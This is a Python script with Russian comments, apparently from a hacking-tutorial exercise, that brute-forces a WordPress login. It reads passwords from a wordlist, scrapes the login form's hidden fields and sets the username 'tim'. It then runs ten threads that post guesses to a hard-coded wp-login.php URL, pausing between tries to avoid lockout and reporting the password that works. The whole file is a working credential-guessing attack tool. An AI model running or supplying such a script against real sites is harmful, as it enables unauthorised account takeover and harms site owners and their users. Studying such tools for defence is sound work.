from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time


SUCCESS = 'Welcome to WordPress!'
TARGET = "http://boodelyboo.com/wordpress/wp-login.php"
WORDLIST = 'cain.txt'


def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    words = Queue()

    for word in raw_words.split():
        words.put(word)
    return words


def get_params(content):
    """Функция get_params  принимает тело HTTP-ответа,
разбирает его и циклически проходится по всем элементам input , чтобы
составить словарь с параметрами, которые нам нужно заполнить"""
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params


class Bruter:
    """отправкa всех HTTP-запросов и обработкa cookie"""
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print('Finished the setup where username = %s\n' % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords, ))
            t.start()

    def web_bruter(self, passwords):
        """ инициализиация объекта Session, который будет автоматически обрабатывать cookie. Затем выполняем начальный
        запрос к форме входа. Получив исходный HTML-код, передаем его функции get_params, которая разбирает содержимое
        параметров и возвращает словарь со всеми извлеченными элементами формы. После успешного разбора HTML заменяем
        параметр username. Теперь можно начинать циклический перебор потенциальных паролей.

        Внутри цикла  мы на несколько секунд останавливаемся в попытке избежать блокирования учетной записи.
        Затем достаем из очереди пароль и используем его для окончательного заполнения словаря с параметрами.
        Если в очередине осталось паролей, поток завершается.

        На третьем этапе шлем POST-запрос со словарем параметров. Когда придет ответ на попытку аутентифицироваться,
        проверяем, была ли она успешной, то есть содержит ли ответ строку SUCCESS, определенную нами ранее.
        Если эта строка присутствует и удалось войти, очищаем очередь, чтобы другие потоки могли быстро завершить свою работу"""
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd)
                print('done: now cleaning up other threads. . .')


if __name__ == '__main__':
    words = get_words()
    b = Bruter('tim', TARGET)
    b.run_bruteforce(words)